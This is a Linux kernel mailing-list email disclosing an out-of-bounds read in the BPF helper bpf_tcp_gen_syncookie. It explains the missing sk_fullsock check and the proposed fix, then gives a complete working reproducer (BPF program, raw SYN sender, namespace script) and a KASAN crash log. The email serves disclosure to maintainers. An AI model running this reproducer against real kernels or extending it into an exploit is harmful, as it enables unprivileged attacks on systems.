Received: from mail-pl1-f178.google.com (mail-pl1-f178.google.com [209.85.214.178])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 0918D30F92E
	for <bpf@vger.kernel.org>; Sat,  1 Aug 2026 14:00:00 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.178
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785592804; cv=none; b=HzQAQzKT015bLOO85G8JiTCvGLufZgVClGFOgUFetED5l2tiNFbBkLCgTSj7qgjsVB7tNHkPot0NdUXQJkQGzl06o0YQqeMO2LGOfNB2cFRUWkAy4TXyuadZX7JEEDxyTfYkReeFYbjK6bVbLG5IsQZ3W5ET8HhYkhtWdwn1OVM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785592804; c=relaxed/simple;
	bh=kEGQSW+XTEQsxH/N1vVGknN7tIxkgIMedUQUdr94EJI=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=Akz2xnPLUDBgdAcf/gFXT1uRr++1R6YxarvoGAXsJMTdtoi9GW/p6A+tEcULwboor6apE3Y9XleExwNcTi2iXFGeRW3VdNFuYr8Soehpzs/3z0WP2Usi62Pd4F+DDxU74I3G0xegknx7vYU1DVOnUz/30i5tAafkC55IL0hyahs=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=fzYm6PSq; arc=none smtp.client-ip=209.85.214.178
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="fzYm6PSq"
Received: by mail-pl1-f178.google.com with SMTP id d9443c01a7336-2ce7d2adef4so31925005ad.3
        for <bpf@vger.kernel.org>; Sat, 01 Aug 2026 07:00:00 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1785592800; x=1786197600; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=azoJwDM+ltvWVUWZsCZ7T4qcwPQ9JkFR4gpUcbW0Z8Y=;
        b=fzYm6PSqxqRyJpXn3VYGZ6lLrmcVzDRcupZbuNom9RTO0EZGu5Q74l82ABFIn+P9KG
         NFD+7k1DGtkPdKjQcfSxsr3uc47EbyNUob3ZtfJcyaxbjAqjdz469IldUgkhZpTfo4D0
         mY8ZUPThIrPtbRmnnT2O9S8uEdGPwZ7LxNKhg4PceHWRKn7WsShI1iCGsQSXL/JXD/k7
         iJSl5vxYPOY4HYzpW7aGg+OsLtUYcegjXSz+DZTxvk/cIP3xjq1R3RHzGoCBGtUajYte
         2PrmroG5oYvPULZerwR3drhdy2jUPTBQU2+2ipO7ZofhEAq+wVkfXIzx38gQJ7tuszqA
         lpSg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785592800; x=1786197600;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=azoJwDM+ltvWVUWZsCZ7T4qcwPQ9JkFR4gpUcbW0Z8Y=;
        b=bCyEBXJV3lkwHO/QRxqiIkkviwDS/ol0wdvMtudluqUBZEM3NQgRHkVnzXrOpIL78U
         eZxB3fgwxwJ5m/7718gQhNfN6H17jr1FogfxxokJwgJSuUClgCbiavYKDBUfTKh2KR8P
         mX79F/XHzdONJJBE8F0AJvX3DLZFEe6gwcv4eS6U3Vd6tocmT8fGWu2RM2bCs7Bni7mW
         i4I0mA0g8zpotWpK+8enjiS406TGmQqpoKwmaU7ooKFvFzCE41HeRJpDM7Tkvalm4RAj
         9Zeovn7hRaskKv9vCS7uaZsK92bHRTtQEMd6EmBYQJW0qaggJdkeqxQ9lxqD071Be6CK
         +Dsw==
X-Gm-Message-State: AOJu0YyOr7H4dUcVmNeTbDCbRZexSxnavRz1Ch1F1sRIQbtLgDQmBg8/
	vnJRTB2Ftdjf/zGGaXpo8gyxwbmRYraxTMSjVLaG1sZinp3MYlyLh7Brv50wHSjL
X-Gm-Gg: AR+sD10CCrgRbkMIgdsk2Bzw9NceTELQ5o7P0PPjWf3uLpRTLjN+WKVgOyG6rG2DG6x
	Y4/1juDxcIb/LIf9dYixnST+4QByZZpTK0ZD0OD2ZLCsKH5gRbAJrB4Uw0kw3m6ybsy+h3QM6E/
	nKl6qQcubem73tvL4CeWHsLCKmX4j5dUOJMCi++khQqgIlTd5pnY96RyHYQBNWbUAqrjJNv/6cI
	u3z4u7nBArDriUXmSeGaarcxDMWItbvk3A3EPjUC2yOF6bjlXNrpcK7yu0N9kr5Wls16H1kZieY
	IWH9iAUT4yMrU46wMEdj+78npbNAus43AiA7A7ELlDKvuYXG9Y1AgWcKye/3+6BGx6E5oOBUjyg
	OCFXPVxchKlIcpC4dgJoCrTSliGmfW40gi+MPJvZDV1lLdeU67KxtDHVRWRlcGVYNMOT6/jbq/S
	j23WbbRmIsZe0Hb0N2sKo8rY0sjEMPORrGW2XW33eUvkhFriit3EWUlxsKJp+dMwJptGDHmiudJ
	lHH
X-Received: by 2002:a17:902:da86:b0:2cf:4544:104b with SMTP id d9443c01a7336-2d0521a57cdmr33970255ad.5.1785592799892;
        Sat, 01 Aug 2026 06:59:59 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([165.232.167.5])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-3153e18d9c6sm18493764eec.30.2026.08.01.06.59.47
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 01 Aug 2026 06:59:59 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: bpf@vger.kernel.org,
	netdev@vger.kernel.org
Cc: ast@kernel.org,
	daniel@iogearbox.net,
	andrii@kernel.org,
	eddyz87@gmail.com,
	memxor@gmail.com,
	martin.lau@linux.dev,
	song@kernel.org,
	yonghong.song@linux.dev,
	jolsa@kernel.org,
	emil@etsalapatis.com,
	john.fastabend@gmail.com,
	sdf@fomichev.me,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	lmb@cloudflare.com,
	vega@nebusec.ai,
	rakukuip@gmail.com,
	enjou1224z@gmail.com
Subject: [PATCH bpf 0/1] bpf: Fix out-of-bounds read in bpf_tcp_gen_syncookie
Date: Sat,  1 Aug 2026 21:59:38 +0800
Message-ID: <cover.1785576172.git.rakukuip@gmail.com>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Luxiao Xu <rakukuip@gmail.com>

Hi Linux kernel maintainers,

We found and validated an issue in net/core/filter.c. The bug is reachable
by an unprivileged user via user and net namespaces.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

The BPF helper function `bpf_tcp_gen_syncookie` in `net/core/filter.c`
advertises its socket argument as `ARG_PTR_TO_BTF_ID_SOCK_COMMON` in the verifier.
Consequently, a BPF program can pass a mini-socket object (such as `TCP_NEW_SYN_RECV`
or `TCP_TIME_WAIT` sockets obtained via `bpf_skc_lookup_tcp`) to this helper.

Mini-sockets only allocate memory sufficient for `struct sock_common`.
However, `bpf_tcp_gen_syncookie` attempts to read `sk->sk_protocol` before
checking `sk_fullsock(sk)`. Because `sk_protocol` is located in `struct sock`
beyond the allocated boundaries of mini-sockets, reading `sk->sk_protocol`
results in an out-of-bounds (OOB) kernel read.

Root cause:
Introduced in commit c0df236e1394 ("bpf: Change bpf_tcp_*_syncookie to accept ARG_PTR_TO_BTF_ID_SOCK_COMMON")
due to missing `sk_fullsock(sk)` validation prior to accessing `sk->sk_protocol` in `bpf_tcp_gen_syncookie`.

Fix:
Reorder the check to evaluate `if (!sk_fullsock(sk))` before reading `sk->sk_protocol`.
The `sk_fullsock()` check safely inspects `sk->sk_state` (which resides inside `struct sock_common`),
ensuring `sk->sk_protocol` is only accessed after confirming `sk` is a full socket.

Reproducer:

    clang -O2 -target bpf -c poc.bpf.c -o poc.bpf.o
    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.bpf.c------

#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/pkt_cls.h>
#include <linux/tcp.h>

#define SERVER_PORT 12345
#define CLIENT_PORT 54321
#define SEC(NAME) __attribute__((section(NAME), used))

static struct bpf_sock *(*bpf_skc_lookup_tcp)(struct __sk_buff *skb,
					      struct bpf_sock_tuple *tuple,
					      __u32 tuple_size, __u64 netns,
					      __u64 flags) =
	(void *)BPF_FUNC_skc_lookup_tcp;
static struct bpf_sock *(*bpf_sk_fullsock)(struct bpf_sock *sk) =
	(void *)BPF_FUNC_sk_fullsock;
static long (*bpf_tcp_gen_syncookie)(struct bpf_sock *sk, void *iph,
					    __u32 iph_len, struct tcphdr *th,
					    __u32 th_len) =
	(void *)BPF_FUNC_tcp_gen_syncookie;
static long (*bpf_sk_release)(struct bpf_sock *sk) =
	(void *)BPF_FUNC_sk_release;

static __always_inline __u16 bpf_htons(__u16 v)
{
	return __builtin_bswap16(v);
}

SEC("tc")
int trigger_syncookie_oob(struct __sk_buff *skb)
{
	struct bpf_sock_tuple tuple = {};
	struct bpf_sock *sk;
	struct ethhdr *eth;
	struct iphdr *iph;
	struct tcphdr *th;
	void *data;
	void *data_end;

	data = (void *)(long)skb->data;
	data_end = (void *)(long)skb->data_end;

	eth = data;
	if ((void *)(eth + 1) > data_end)
		return TC_ACT_OK;
	if (eth->h_proto != bpf_htons(ETH_P_IP))
		return TC_ACT_OK;

	iph = (void *)(eth + 1);
	if ((void *)(iph + 1) > data_end)
		return TC_ACT_OK;
	if (iph->protocol != IPPROTO_TCP)
		return TC_ACT_OK;
	if (iph->ihl != sizeof(*iph) / 4)
		return TC_ACT_OK;

	th = (void *)(iph + 1);
	if ((void *)(th + 1) > data_end)
		return TC_ACT_OK;
	if (!th->syn || th->ack || th->rst || th->fin)
		return TC_ACT_OK;
	if (th->doff != sizeof(*th) / 4)
		return TC_ACT_OK;
	if (th->source != bpf_htons(CLIENT_PORT) ||
	    th->dest != bpf_htons(SERVER_PORT))
		return TC_ACT_OK;

	tuple.ipv4.saddr = iph->saddr;
	tuple.ipv4.daddr = iph->daddr;
	tuple.ipv4.sport = th->source;
	tuple.ipv4.dport = th->dest;

	sk = bpf_skc_lookup_tcp(skb, &tuple, sizeof(tuple.ipv4),
				BPF_F_CURRENT_NETNS, 0);
	if (!sk)
		return TC_ACT_OK;

	if (!bpf_sk_fullsock(sk)) {
		bpf_tcp_gen_syncookie(sk, iph, sizeof(*iph), th, sizeof(*th));
	}

	bpf_sk_release(sk);
	return TC_ACT_OK;
}

char LICENSE[] SEC("license") = "GPL";

------END poc.bpf.c------

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

static volatile sig_atomic_t keep_running = 1;

static void handle_signal(int signo)
{
	(void)signo;
	keep_running = 0;
}

static uint16_t checksum(const void *buf, size_t len)
{
	const uint16_t *words = buf;
	uint32_t sum = 0;

	while (len > 1) {
		sum += *words++;
		len -= 2;
	}

	if (len)
		sum += *(const uint8_t *)words;

	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);

	return (uint16_t)~sum;
}

static uint16_t tcp_checksum(const struct iphdr *iph, const struct tcphdr *th)
{
	struct pseudo_hdr {
		uint32_t saddr;
		uint32_t daddr;
		uint8_t zero;
		uint8_t protocol;
		uint16_t len;
	} __attribute__((packed)) pseudo = {
		.saddr = iph->saddr,
		.daddr = iph->daddr,
		.zero = 0,
		.protocol = IPPROTO_TCP,
		.len = htons(sizeof(*th)),
	};
	uint8_t buf[sizeof(pseudo) + sizeof(*th)];
	struct tcphdr tmp = *th;

	tmp.check = 0;
	memcpy(buf, &pseudo, sizeof(pseudo));
	memcpy(buf + sizeof(pseudo), &tmp, sizeof(tmp));
	return checksum(buf, sizeof(buf));
}

static void parse_mac(const char *text, uint8_t mac[ETH_ALEN])
{
	unsigned int bytes[ETH_ALEN];
	int i;

	if (sscanf(text, "%02x:%02x:%02x:%02x:%02x:%02x",
		   &bytes[0], &bytes[1], &bytes[2],
		   &bytes[3], &bytes[4], &bytes[5]) != ETH_ALEN) {
		fprintf(stderr, "invalid MAC address: %s\n", text);
		exit(EXIT_FAILURE);
	}

	for (i = 0; i < ETH_ALEN; i++)
		mac[i] = bytes[i];
}

static void get_ifinfo(const char *ifname, int *ifindex, uint8_t mac[ETH_ALEN])
{
	struct ifreq ifr = {};
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket(AF_INET)");
		exit(EXIT_FAILURE);
	}

	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) {
		perror("SIOCGIFINDEX");
		close(fd);
		exit(EXIT_FAILURE);
	}
	*ifindex = ifr.ifr_ifindex;

	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
		perror("SIOCGIFHWADDR");
		close(fd);
		exit(EXIT_FAILURE);
	}
	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static int run_server(const char *ip, const char *port_text)
{
	struct sigaction sa = {};
	struct sockaddr_in addr = {};
	int fd;
	int port;
	int one = 1;

	port = atoi(port_text);
	if (port <= 0 || port > 65535) {
		fprintf(stderr, "invalid port: %s\n", port_text);
		return EXIT_FAILURE;
	}

	sa.sa_handler = handle_signal;
	sigaction(SIGINT, &sa, NULL);
	sigaction(SIGTERM, &sa, NULL);

	fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0) {
		perror("socket");
		return EXIT_FAILURE;
	}

	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0) {
		perror("setsockopt");
		close(fd);
		return EXIT_FAILURE;
	}

	addr.sin_family = AF_INET;
	addr.sin_port = htons((uint16_t)port);
	if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) {
		fprintf(stderr, "invalid IPv4 address: %s\n", ip);
		close(fd);
		return EXIT_FAILURE;
	}

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		perror("bind");
		close(fd);
		return EXIT_FAILURE;
	}

	if (listen(fd, 128) < 0) {
		perror("listen");
		close(fd);
		return EXIT_FAILURE;
	}

	while (keep_running)
		pause();

	close(fd);
	return EXIT_SUCCESS;
}

static int run_syn_sender(char **argv)
{
	struct sockaddr_ll sll = {};
	uint8_t frame[ETH_HLEN + sizeof(struct iphdr) + sizeof(struct tcphdr)];
	struct ethhdr *eth = (struct ethhdr *)frame;
	struct iphdr *iph = (struct iphdr *)(frame + ETH_HLEN);
	struct tcphdr *th = (struct tcphdr *)(frame + ETH_HLEN + sizeof(*iph));
	uint8_t src_mac[ETH_ALEN];
	uint8_t dst_mac[ETH_ALEN];
	const char *ifname = argv[2];
	const char *dst_mac_text = argv[3];
	const char *src_ip_text = argv[4];
	const char *dst_ip_text = argv[5];
	uint16_t src_port = (uint16_t)atoi(argv[6]);
	uint16_t dst_port = (uint16_t)atoi(argv[7]);
	unsigned int count = (unsigned int)atoi(argv[8]);
	int ifindex;
	int fd;
	unsigned int i;

	if (count == 0) {
		fprintf(stderr, "count must be > 0\n");
		return EXIT_FAILURE;
	}

	get_ifinfo(ifname, &ifindex, src_mac);
	parse_mac(dst_mac_text, dst_mac);

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (fd < 0) {
		perror("socket(AF_PACKET)");
		return EXIT_FAILURE;
	}

	memset(frame, 0, sizeof(frame));
	memcpy(eth->h_source, src_mac, ETH_ALEN);
	memcpy(eth->h_dest, dst_mac, ETH_ALEN);
	eth->h_proto = htons(ETH_P_IP);

	iph->version = 4;
	iph->ihl = 5;
	iph->tos = 0;
	iph->tot_len = htons(sizeof(*iph) + sizeof(*th));
	iph->id = htons(0x4141);
	iph->frag_off = 0;
	iph->ttl = 64;
	iph->protocol = IPPROTO_TCP;
	if (inet_pton(AF_INET, src_ip_text, &iph->saddr) != 1 ||
	    inet_pton(AF_INET, dst_ip_text, &iph->daddr) != 1) {
		fprintf(stderr, "invalid IPv4 address\n");
		close(fd);
		return EXIT_FAILURE;
	}
	iph->check = checksum(iph, sizeof(*iph));

	th->source = htons(src_port);
	th->dest = htons(dst_port);
	th->seq = htonl(0x1000);
	th->ack_seq = 0;
	th->doff = sizeof(*th) / 4;
	th->syn = 1;
	th->window = htons(65535);
	th->check = tcp_checksum(iph, th);

	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifindex;
	sll.sll_halen = ETH_ALEN;
	memcpy(sll.sll_addr, dst_mac, ETH_ALEN);

	for (i = 0; i < count; i++) {
		ssize_t sent = sendto(fd, frame, sizeof(frame), 0,
				     (struct sockaddr *)&sll, sizeof(sll));
		if (sent != (ssize_t)sizeof(frame)) {
			if (sent < 0)
				perror("sendto");
			else
				fprintf(stderr, "short send: %zd\n", sent);
			close(fd);
			return EXIT_FAILURE;
		}
		usleep(100000);
	}

	close(fd);
	return EXIT_SUCCESS;
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"usage:\n"
		"  %s server <listen-ip> <listen-port>\n"
		"  %s syn <ifname> <dst-mac> <src-ip> <dst-ip> <src-port> <dst-port> <count>\n",
		prog, prog);
}

int main(int argc, char **argv)
{
	if (argc >= 2 && strcmp(argv[1], "server") == 0) {
		if (argc != 4) {
			usage(argv[0]);
			return EXIT_FAILURE;
		}
		return run_server(argv[2], argv[3]);
	}

	if (argc >= 2 && strcmp(argv[1], "syn") == 0) {
		if (argc != 9) {
			usage(argv[0]);
			return EXIT_FAILURE;
		}
		return run_syn_sender(argv);
	}

	usage(argv[0]);
	return EXIT_FAILURE;
}

------END poc.c------

------BEGIN poc.sh------

#!/bin/sh
set -eu

DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SRV_NS=srvk8x
CLI_NS=clik8x
VETH_SRV=vethk8x0
VETH_CLI=vethk8x1
SERVER_IP=10.0.0.1
CLIENT_IP=10.0.0.2
SERVER_PORT=12345
CLIENT_PORT=54321
SERVER_PID=

cleanup() {
	if [ -n "${SERVER_PID}" ]; then
		kill "${SERVER_PID}" 2>/dev/null || true
		wait "${SERVER_PID}" 2>/dev/null || true
	fi
	ip netns del "${SRV_NS}" 2>/dev/null || true
	ip netns del "${CLI_NS}" 2>/dev/null || true
}

trap cleanup EXIT INT TERM

sysctl -q -w kernel.panic_on_warn=0

ip netns del "${SRV_NS}" 2>/dev/null || true
ip netns del "${CLI_NS}" 2>/dev/null || true
ip netns add "${SRV_NS}"
ip netns add "${CLI_NS}"
ip link add "${VETH_SRV}" type veth peer name "${VETH_CLI}"
ip link set "${VETH_SRV}" netns "${SRV_NS}"
ip link set "${VETH_CLI}" netns "${CLI_NS}"
ip -n "${SRV_NS}" addr add "${SERVER_IP}/24" dev "${VETH_SRV}"
ip -n "${CLI_NS}" addr add "${CLIENT_IP}/24" dev "${VETH_CLI}"
ip -n "${SRV_NS}" link set lo up
ip -n "${CLI_NS}" link set lo up
ip -n "${SRV_NS}" link set "${VETH_SRV}" up
ip -n "${CLI_NS}" link set "${VETH_CLI}" up
ip netns exec "${CLI_NS}" iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP

PEER_MAC=$(ip netns exec "${SRV_NS}" cat "/sys/class/net/${VETH_SRV}/address")

ip netns exec "${SRV_NS}" tc qdisc add dev "${VETH_SRV}" clsact
ip netns exec "${SRV_NS}" tc filter add dev "${VETH_SRV}" ingress bpf da obj "${DIR}/poc.bpf.o" sec tc

ip netns exec "${SRV_NS}" "${DIR}/poc" server "${SERVER_IP}" "${SERVER_PORT}" &
SERVER_PID=$!
sleep 1

ip netns exec "${CLI_NS}" "${DIR}/poc" syn "${VETH_CLI}" "${PEER_MAC}" "${CLIENT_IP}" "${SERVER_IP}" "${CLIENT_PORT}" "${SERVER_PORT}" 1
sleep 1
ip netns exec "${CLI_NS}" "${DIR}/poc" syn "${VETH_CLI}" "${PEER_MAC}" "${CLIENT_IP}" "${SERVER_IP}" "${CLIENT_PORT}" "${SERVER_PORT}" 8
sleep 2

------END poc.sh------

----BEGIN crash log----

[  467.979050][    C0] =========================================================
[  467.979877][    C0] BUG: KASAN: slab-out-of-bounds in bpf_tcp_gen_syncookie+0
[  467.980777][    C0] Read of size 2 at addr ffff88804a2ff0ac by task poc/9946
[  467.981416][    C0] 
[  467.981727][    C0] CPU: 0 UID: 0 PID: 9946 Comm: poc Not tainted 7.0.0-rc6- 
[  467.981736][    C0] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, a4
[  467.981755][    C0] Call Trace:
[  467.981771][    C0]  <IRQ>
[  467.981776][    C0]  dump_stack_lvl+0x10e/0x1f0
[  467.981912][    C0]  print_report+0xf7/0x600
[  467.981968][    C0]  ? preempt_count_sub+0x13/0xd0
[  467.982018][    C0]  ? __virt_addr_valid+0x1ab/0x330
[  467.982059][    C0]  ? __phys_addr+0x41/0x90
[  467.982068][    C0]  ? bpf_tcp_gen_syncookie+0xf2/0x340
[  467.982075][    C0]  kasan_report+0xe4/0x120
[  467.982082][    C0]  ? bpf_tcp_gen_syncookie+0xf2/0x340
[  467.982089][    C0]  bpf_tcp_gen_syncookie+0xf2/0x340
[  467.982096][    C0]  ? __pfx_bpf_tcp_gen_syncookie+0x10/0x10
[  467.982110][    C0]  ? bpf_tc_skc_lookup_tcp+0xb3/0xd0
[  467.982119][    C0]  bpf_prog_863766db2eacd497_trigger_syncook+0x137/0x14c
[  467.982141][    C0]  cls_bpf_classify+0x358/0x9c0
[  467.982164][    C0]  ? __pfx_cls_bpf_classify+0x10/0x10
[  467.982169][    C0]  tcf_classify+0xa90/0xbc0
[  467.982198][    C0]  tc_run+0x2c1/0x410
[  467.982221][    C0]  ? __pfx_tc_run+0x10/0x10
[  467.982229][    C0]  __netif_receive_skb_core.constprop.0+0xb3d/0x2220
[  467.982244][    C0]  ? __pfx_call_function_single_prep_ipi+0x10/0x10
[  467.982266][    C0]  ? rcu_is_watching+0x3d/0x80
[  467.982299][    C0]  ? __pfx___netif_receive_skb_core.constprop.0+0x10/0x10
[  467.982307][    C0]  ? call_function_single_prep_ipi+0x99/0x140
[  467.982317][    C0]  ? pick_eevdf+0x338/0x380
[  467.982334][    C0]  ? wakeup_preempt_fair+0x49a/0x690
[  467.982341][    C0]  ? process_backlog+0x1fe/0xd40
[  467.982356][    C0]  __netif_receive_skb_one_core+0x9b/0x180
[  467.982365][    C0]  ? __pfx___netif_receive_skb_one_core+0x10/0x10
[  467.982373][    C0]  ? lock_release+0x225/0x2f0
[  467.982384][    C0]  ? rcu_is_watching+0x3d/0x80
[  467.982392][    C0]  ? lock_acquire+0x303/0x360
[  467.982397][    C0]  ? process_backlog+0x1fe/0xd40
[  467.982405][    C0]  ? rcu_is_watching+0x3d/0x80
[  467.982412][    C0]  ? process_backlog+0x1fe/0xd40
[  467.982420][    C0]  __netif_receive_skb+0x1f/0xa0
[  467.982428][    C0]  process_backlog+0x279/0xd40
[  467.982436][    C0]  ? process_backlog+0x1fe/0xd40
[  467.982444][    C0]  __napi_poll.constprop.0+0x6a/0x350
[  467.982450][    C0]  net_rx_action+0x6ed/0x8e0
[  467.982456][    C0]  ? __pfx_net_rx_action+0x10/0x10
[  467.982461][    C0]  ? trace_rcu_utilization+0x139/0x190
[  467.982468][    C0]  ? sched_clock+0x38/0x60
[  467.982497][    C0]  ? rcu_is_watching+0x3d/0x80
[  467.982504][    C0]  handle_softirqs+0x168/0x740
[  467.982516][    C0]  ? __pfx_handle_softirqs+0x10/0x10
[  467.982522][    C0]  ? sched_core_idle_cpu+0x5d/0x110
[  467.982539][    C0]  ? __dev_queue_xmit+0x73f/0x2ee0
[  467.982547][    C0]  do_softirq+0xad/0xe0
[  467.982554][    C0]  </IRQ>
[  467.982556][    C0]  <TASK>
[  467.982558][    C0]  __local_bh_enable_ip+0xd1/0xf0
[  467.982564][    C0]  ? __dev_queue_xmit+0x73f/0x2ee0
[  467.982572][    C0]  __dev_queue_xmit+0x754/0x2ee0
[  467.982581][    C0]  ? __might_fault+0x8c/0xd0
[  467.982609][    C0]  ? rcu_is_watching+0x3d/0x80
[  467.982617][    C0]  ? lock_release+0x225/0x2f0
[  467.982622][    C0]  ? unwind_get_return_address+0x32/0x50
[  467.982633][    C0]  ? __pfx___dev_queue_xmit+0x10/0x10
[  467.982641][    C0]  ? __might_fault+0x8c/0xd0
[  467.982648][    C0]  ? should_fail_ex+0x85/0x310
[  467.982723][    C0]  ? _copy_from_iter+0x114/0xe50
[  467.982750][    C0]  ? __pfx__copy_from_iter+0x10/0x10
[  467.982756][    C0]  ? sock_alloc_send_pskb+0x567/0x630
[  467.982775][    C0]  ? __pfx_ref_tracker_alloc+0x10/0x10
[  467.982784][    C0]  ? packet_parse_headers+0x17a/0x4f0
[  467.982863][    C0]  ? __pfx_packet_parse_headers+0x10/0x10
[  467.982869][    C0]  ? skb_copy_datagram_from_iter+0x358/0x4b0
[  467.982885][    C0]  packet_xmit+0x175/0x210
[  467.982892][    C0]  packet_sendmsg+0x18f9/0x3000
[  467.982899][    C0]  ? avc_has_perm_noaudit+0x2b0/0x370
[  467.982950][    C0]  ? sock_has_perm+0x1aa/0x220
[  467.982964][    C0]  ? __pfx_sock_has_perm+0x10/0x10
[  467.982981][    C0]  ? __pfx_packet_sendmsg+0x10/0x10
[  467.982988][    C0]  ? __might_fault+0x8c/0xd0
[  467.982997][    C0]  __sys_sendto+0x3dc/0x3f0
[  467.983004][    C0]  ? __pfx_packet_sendmsg+0x10/0x10
[  467.983010][    C0]  ? __pfx___sys_sendto+0x10/0x10
[  467.983016][    C0]  ? rcu_is_watching+0x3d/0x80
[  467.983024][    C0]  ? lock_release+0x225/0x2f0
[  467.983031][    C0]  ? __pfx___sys_socket+0x10/0x10
[  467.983049][    C0]  ? __pfx_fput_close_sync+0x10/0x10
[  467.983080][    C0]  __x64_sys_sendto+0x76/0x90
[  467.983085][    C0]  do_syscall_64+0x116/0x800
[  467.983107][    C0]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  467.983129][    C0] RIP: 0033:0x42acd7
[  467.983139][    C0] Code: 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 000
[  467.983145][    C0] RSP: 002b:00007ffceb704658 EFLAGS: 00000202 ORIG_RAX: 00c
[  467.983160][    C0] RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 00000007
[  467.983164][    C0] RDX: 0000000000000036 RSI: 00007ffceb7047a0 RDI: 00000003
[  467.983168][    C0] RBP: 00007ffceb7046b0 R08: 00007ffceb7046b0 R09: 00000004
[  467.983172][    C0] R10: 0000000000000000 R11: 0000000000000202 R12: 00000000
[  467.983175][    C0] R13: 0000000000000000 R14: 00007ffceb7047a0 R15: 00000008
[  467.983186][    C0]  </TASK>
[  467.983188][    C0] 
[  468.032568][    C0] The buggy address belongs to the object at ffff88804a2ff0
[  468.032568][    C0]  which belongs to the cache request_sock_TCP of size 352
[  468.033848][    C0] The buggy address is located 108 bytes inside of
[  468.033848][    C0]  allocated 352-byte region [ffff88804a2ff040, ffff88804a)
[  468.035747][    C0] 
[  468.035985][    C0] The buggy address belongs to the physical page:
[  468.036666][    C0] page: refcount:0 mapcount:0 mapping:0000000000000000 inde
[  468.037545][    C0] head: order:1 mapcount:0 entire_mapcount:0 nr_pages_mapp0
[  468.038597][    C0] memcg:ffff88804a2ffee1
[  468.039166][    C0] flags: 0xfff00000000240(workingset|head|node=0|zone=1|la)
[  468.040207][    C0] page_type: f5(slab)
[  468.040614][    C0] raw: 00fff00000000240 ffff88801797d140 ffff888018f82a08 8
[  468.041388][    C0] raw: ffff88804a2feea0 0000000800130009 00000000f5000000 1
[  468.042086][    C0] head: 00fff00000000240 ffff88801797d140 ffff888018f82a088
[  468.042804][    C0] head: ffff88804a2feea0 0000000800130009 00000000f50000001
[  468.043551][    C0] head: 00fff00000000001 ffffffffffffff81 00000000fffffffff
[  468.044322][    C0] head: ffffffffffffffff 0000000000000000 00000000ffffffff2
[  468.045099][    C0] page dumped because: kasan: bad access detected
[  468.045906][    C0] page_owner tracks the page as allocated
[  468.046460][    C0] page last allocated via order 1, migratetype Unmovable, 3
